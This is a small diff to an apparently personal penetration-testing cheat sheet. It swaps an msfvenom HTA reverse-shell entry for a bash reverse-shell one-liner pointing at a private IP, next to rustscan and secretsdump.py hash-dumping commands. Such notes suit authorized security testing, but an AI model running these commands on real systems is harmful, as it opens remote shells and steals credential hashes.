@@ -23,9 +23,8 @@ adittionals:
     rustscan:
         sudo docker run -it --rm --name rustscan rustscan/rustscan:2.1.1
 
-    rev shellwith hta file:
-        msfvenom ..... -f hta-sch -o shell.hta
-        mshta.exe
+    bash rev shell:
+        bash -c 'bash -i >& /dev/tcp/192.168.45.227/443 0>&1'
 
     SAM and SYSTEM hashes:
         secretsdump.py -sam SAM -system SYSTEM LOCAL
